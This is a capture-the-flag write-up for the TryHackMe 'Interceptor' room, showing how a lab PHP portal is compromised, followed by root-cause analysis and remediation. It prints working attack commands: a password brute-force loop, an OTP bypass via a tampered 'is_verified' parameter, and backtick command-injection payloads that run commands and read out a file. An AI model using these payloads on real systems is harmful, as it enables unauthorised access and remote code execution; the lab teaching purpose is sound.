# Interceptor - TryHackMe Writeup

**Platform:** TryHackMe
**Room:** Interceptor
**Category:** Jr Penetration Tester / Jr Pentester Challenges
**Difficulty:** Medium
**Target IP:** 10.49.128.93
**Author of writeup:** (your handle)
**Date:** 2026-08-30

---

## Table of Contents

1. [Overview](#overview)
2. [Objectives](#objectives)
3. [Reconnaissance](#reconnaissance)
   - [Port Scan](#port-scan)
   - [Web Application Mapping](#web-application-mapping)
   - [Catch-all Behaviour](#catch-all-behaviour)
   - [Content Discovery](#content-discovery)
4. [Exploitation](#exploitation)
   - [Step 1: Source Disclosure via Backup File](#step-1-source-disclosure-via-backup-file)
   - [Step 2: Credential Recovery](#step-2-credential-recovery)
   - [Step 3: OTP / Verification Bypass (Parameter Tampering)](#step-3-otp--verification-bypass-parameter-tampering)
   - [Step 4: Command Injection via Import Feed](#step-4-command-injection-via-import-feed)
5. [Flags](#flags)
6. [Root Cause Analysis](#root-cause-analysis)
7. [Remediation](#remediation)
8. [Lessons Learned](#lessons-learned)
9. [Appendix: Command Reference](#appendix-command-reference)

---

## Overview

MediaHub is presented as an internal content-management portal used by journalists.
Access is gated behind a login form and a two-step verification (OTP) system.
The challenge scenario asks the attacker to observe and manipulate the traffic
between the browser and the backend APIs, and to demonstrate that a small
modification to a request is sufficient to bypass the intended access controls.

The engagement resulted in a full compromise: administrative access was gained by
bypassing the verification workflow through client-controlled parameter tampering,
and remote command execution was achieved through an unsanitised server-side
`curl` invocation in the application's feed-import functionality.

---

## Objectives

| # | Question | Answer Format |
|---|----------|---------------|
| 1 | What is the flag value after logging in as admin? | `***{*****_******_*****_****}` |
| 2 | What is the value of `/var/www/user.txt`? | `***{******_*****_************}` |

---

## Reconnaissance

### Port Scan

A targeted TCP scan of the common service ports was performed.

```bash
nmap -Pn -T4 -p 22,80,443,3000,8000,8080,5000,8443 10.49.128.93
```

Result:

```
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
3000/tcp closed ppp
5000/tcp closed upnp
8000/tcp closed http-alt
8080/tcp closed http-proxy
8443/tcp closed https-alt
```

Only SSH (22) and HTTP (80) are exposed. The challenge is web-focused, so effort
was directed at port 80.

### Web Application Mapping

The application (`MediaHub`) is a PHP application served by
`Apache/2.4.41 (Ubuntu)`. The landing page exposes a `Login` link.

```bash
curl -s -i http://10.49.128.93/
```

Key observations:

- `Set-Cookie: PHPSESSID=...` - PHP session management.
- Login page (`login.php`) submits credentials asynchronously to `api_login.php`
  and parses a JSON response, redirecting on success.
- `dashboard.php` returns `302 -> login.php` when unauthenticated.

The client-side login logic:

```javascript
const res = await fetch("api_login.php", { method: "POST", body: payload });
const data = await res.json();
if (!data.ok) { /* show error */ }
else { window.location = data.redirect; }
```

### Catch-all Behaviour

Requesting a random non-existent path returned the homepage (HTTP 200,
1491 bytes), indicating a catch-all route/rewrite. This makes naive
"200 = exists" enumeration unreliable, so all subsequent discovery was
filtered against the 1491-byte baseline.

```bash
curl -s -o /dev/null -w "%{http_code} len=%{size_download}\n" \
  http://10.49.128.93/zzz_nope_12345.php
# 200 len=1491  -> catch-all confirmed
```

### Content Discovery

`ffuf` was used with the catch-all size filtered out to reveal genuine files.

```bash
ffuf -u http://10.49.128.93/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt \
  -mc all -fs 1491
```

Genuine endpoints identified:

- `login.php`, `api_login.php`
- `dashboard.php`
- `search.php` (requires authentication)
- `otp.php`, `verify_otp.php`
- `config.php`, `header.php`, `footer.php`, `logout.php`

Probing for backup/source-leak variants of the real files surfaced a critical
artefact whose size differed from the catch-all baseline:

```bash
for f in login.php.bak dashboard.php.bak search.php.bak otp.php.bak; do
  echo "$(curl -s http://10.49.128.93/$f | wc -c)  $f"
done
# 2038  login.php.bak   <-- not the 1491 catch-all
```

---

## Exploitation

### Step 1: Source Disclosure via Backup File

`login.php.bak` returned the application source instead of executing it,
exposing a developer comment left in the codebase.

```bash
curl -s http://10.49.128.93/login.php.bak
```

Relevant excerpt:

```php
/*
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| MediaHub + any year
|
| TODO: remove before production deployment
*/
```

This disclosed both a valid administrator email and the password construction
pattern.

### Step 2: Credential Recovery

Given the `MediaHub + <year>` pattern, a small, targeted wordlist was tested
against `api_login.php`.

```bash
for y in $(seq 2015 2027); do
  curl -s http://10.49.128.93/api_login.php \
    --data-urlencode "email=admin@mediahub.thm" \
    --data-urlencode "password=MediaHub$y"
done
```

Successful response:

```json
{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

Valid credentials:

```
admin@mediahub.thm : MediaHub2026
```

Authentication succeeds but the account is placed into a second-factor (OTP)
verification stage before dashboard access is granted.

### Step 3: OTP / Verification Bypass (Parameter Tampering)

After a successful login, `otp.php` presents a six-digit OTP form that submits to
`verify_otp.php`. Submitting an arbitrary OTP returned a JSON body that leaked an
internal state field:

```bash
curl -s -b cookies.jar http://10.49.128.93/verify_otp.php -d "otp=123456"
# {"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

The presence of `is_verified` in the response suggested the server was consuming
a client-influenced value. Supplying that field in the request confirmed the
flaw: the server trusts an attacker-controlled `is_verified` parameter instead of
validating the OTP server-side.

```bash
curl -s -b cookies.jar http://10.49.128.93/verify_otp.php \
  --data "otp=123456&is_verified=true"
# {"ok":true,"message":"OTP verified. Redirecting..."}
```

Complete authenticated flow:

```bash
BASE=http://10.49.128.93

# 1. Login (establishes session)
curl -s -c cookies.jar "$BASE/api_login.php" \
  --data-urlencode "email=admin@mediahub.thm" \
  --data-urlencode "password=MediaHub2026"

# 2. Bypass verification with the tampered parameter
curl -s -b cookies.jar -c cookies.jar "$BASE/verify_otp.php" \
  --data "otp=123456&is_verified=true"

# 3. Access the dashboard
curl -s -b cookies.jar "$BASE/dashboard.php"
```

The dashboard confirmed the elevated context:

```
admin@mediahub.thm
Role: admin
Verified: Yes
```

and disclosed the first flag:

```
Flag: THM{ADMIN_ACCESS_USING_BURP}
```

### Step 4: Command Injection via Import Feed

The dashboard exposes an "Import Feed" feature that accepts a URL, fetches it
server-side with `curl`, and returns the raw output via `import_feed_api.php`.
The client-side JavaScript attempts to sanitise the input:

```javascript
const url = url1.replace(/[;&|]/g, '');
```

This filter is enforced only in the browser. By sending the request directly to
the API (bypassing the client), and by using shell command substitution
(backticks / `$( )`) which the filter does not remove, arbitrary commands were
executed as the web server user.

Baseline request:

```bash
curl -s -b cookies.jar http://10.49.128.93/import_feed_api.php \
  -F "url=http://example.com/feed.xml"
```

Proof of code execution:

```bash
curl -s -b cookies.jar http://10.49.128.93/import_feed_api.php \
  -F 'url=http://x`id`'
```

The returned `cmd_output` contained:

```
uid=33(www-data)
```

The target file was then read. Because the injected output is used as a hostname
by `curl`, whitespace was stripped, corrupting the flag. To exfiltrate the file
intact, the content was base64-encoded server-side before being embedded in the
error output:

```bash
curl -s -b cookies.jar http://10.49.128.93/import_feed_api.php \
  -F 'url=http://`base64 -w0 /var/www/user.txt`.x'
```

The encoded value returned in the "Could not resolve host" message was decoded
locally:

```bash
echo 'VEhNe1NZU1RFTV9QV05FRF9TVUNDRVNTRlVMTFl9Cg==' | base64 -d
# THM{SYSTEM_PWNED_SUCCESSFULLY}
```

---

## Flags

| # | Question | Flag |
|---|----------|------|
| 1 | Flag after logging in as admin | `THM{ADMIN_ACCESS_USING_BURP}` |
| 2 | Contents of `/var/www/user.txt` | `THM{SYSTEM_PWNED_SUCCESSFULLY}` |

---

## Root Cause Analysis

| Finding | Severity | Description |
|---------|----------|-------------|
| Source/backup file exposure | Medium | `login.php.bak` was served as text, disclosing a hardcoded admin email and password pattern along with a developer TODO. |
| Weak, predictable password policy | Medium | The admin password followed a guessable `MediaHub + year` scheme, trivially brute-forced. |
| Broken authentication / verification bypass | High | `verify_otp.php` trusted a client-supplied `is_verified` parameter rather than validating the OTP server-side, allowing full MFA bypass. |
| OS command injection | Critical | `import_feed_api.php` passed user input into a server-side `curl` shell command. Sanitisation was performed only client-side and did not cover command substitution, enabling RCE as `www-data`. |

---

## Remediation

1. **Remove backup and source artefacts.** Never deploy `.bak`, `~`, or `.old`
   copies of source files to the web root. Enforce this in the build/deploy
   pipeline and block such extensions at the web server.
2. **Eliminate hardcoded and predictable credentials.** Remove developer notes
   and test accounts before production. Enforce strong, non-formulaic passwords
   and rotate any credentials that were ever committed or exposed.
3. **Validate authentication state server-side.** The OTP result must be computed
   and stored exclusively on the server (for example, in the session) and must
   never be derived from a request parameter. Ignore any client-supplied
   verification flags.
4. **Never pass user input to a shell.** Replace the `curl` shell call with a
   native HTTP client library. If an external binary is unavoidable, use an
   argument-array execution API (no shell interpolation), strict allow-listing of
   URLs/schemes, and server-side validation. Client-side filtering must never be
   relied upon for security.
5. **Apply least privilege and egress controls.** Restrict the web server user
   and limit outbound network access to reduce the impact of any successful
   injection.

---

## Lessons Learned

- Catch-all routing can mask real content during enumeration; always establish a
  baseline response and filter against it.
- Backup files remain one of the highest-value, lowest-effort findings on PHP
  targets.
- Any security control implemented purely in client-side JavaScript is advisory
  only. Requests should always be tested directly against the API.
- Fields that appear in a response (such as `is_verified`) are strong indicators
  of internal state that may be attacker-influenceable when replayed in a
  request.
- When exfiltrating data through a channel that mangles characters (here, a
  hostname context), encoding the payload (base64) preserves integrity.

---

## Appendix: Command Reference

```bash
BASE=http://10.49.128.93

# Reconnaissance
nmap -Pn -T4 -p 22,80,443,3000,8000,8080,5000,8443 10.49.128.93
ffuf -u $BASE/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt \
  -mc all -fs 1491

# Source disclosure
curl -s $BASE/login.php.bak

# Credential brute (pattern derived from source)
for y in $(seq 2015 2027); do
  curl -s $BASE/api_login.php \
    --data-urlencode "email=admin@mediahub.thm" \
    --data-urlencode "password=MediaHub$y"
done

# Full auth bypass and dashboard (Flag 1)
curl -s -c cookies.jar $BASE/api_login.php \
  --data-urlencode "email=admin@mediahub.thm" \
  --data-urlencode "password=MediaHub2026"
curl -s -b cookies.jar -c cookies.jar $BASE/verify_otp.php \
  --data "otp=123456&is_verified=true"
curl -s -b cookies.jar $BASE/dashboard.php

# Command injection - proof
curl -s -b cookies.jar $BASE/import_feed_api.php -F 'url=http://x`id`'

# Command injection - exfil user.txt (Flag 2)
curl -s -b cookies.jar $BASE/import_feed_api.php \
  -F 'url=http://`base64 -w0 /var/www/user.txt`.x'
# decode the returned base64 string:
echo '<BASE64_STRING>' | base64 -d
```
